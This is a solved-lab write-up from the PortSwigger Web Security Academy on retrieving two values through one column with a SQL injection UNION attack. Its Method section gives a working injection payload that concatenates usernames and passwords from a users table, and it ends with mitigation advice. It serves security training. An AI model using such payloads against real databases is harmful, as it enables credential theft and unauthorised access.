# SQL injection UNION attack, retrieving multiple values in a single column

**Platform:** PortSwigger Web Security Academy (free lab)
**Vulnerability type:** SQL Injection
**Difficulty:** Apprentice
**Solved:** 15 November 2026

## Objective

Retrieve the administrator's username and password together through the single text column.

## Method

1. Use the category parameter with: `Gifts' UNION SELECT NULL, username||'~'||password FROM users--`.

## Result

The page shows `administrator~t17x3ik9re6kgfqm5v5g` — username and password joined by `~`. Lab solved.

## Why it works

Only one column can display text, so the two values are concatenated into one string with `||` (Oracle/PostgreSQL concatenation) and a `~` separator, then split apart after reading.

## Lessons learned

- String concatenation turns one display column into a channel for many values.
- The separator character matters — it must be one that never appears inside a password.

## Mitigation

Parameterized queries stop UNION injection. Store passwords hashed, never in plain text.

---

*Note: this lab is one of PortSwigger Web Security Academy's intentionally vulnerable free training labs. It was solved legally, for learning, on PortSwigger's own lab environment.*
